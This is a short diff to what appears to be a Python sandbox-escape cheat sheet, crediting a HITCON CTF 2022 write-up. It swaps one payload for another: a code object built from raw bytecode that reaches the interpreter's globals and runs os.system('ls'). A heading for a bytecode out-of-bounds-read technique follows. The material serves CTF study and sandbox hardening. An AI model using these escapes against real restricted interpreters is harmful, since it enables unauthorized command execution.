@@ -226,7 +226,8 @@ a().cr_frame.f_globals
 # Thanks to @splitline, https://blog.splitline.tw/hitcon-ctf-2022/#v-o-i-d-misc
 
 # This is just an example
-(lambda x:x).__class__((lambda a,b,c: [a,b,c]).__code__.replace(co_code=b'\x97\x00|\x11|\x11|\x40g\x03S\x00', co_argcount=0, co_nlocals=0, co_varnames=()), {})()[-1].__globals__["sys"].modules["os"].system("ls")
+(lambda:0).__class__((lambda:0).__code__.replace(co_code=b'|\x17S\x00', co_argcount=0, co_nlocals=0, co_varnames=(
+)), {})()["exec"]("import os;os.system('ls')")
 ```
 
 ### Bytecode2RCE exploiting OOB READ with LOAD_FAST
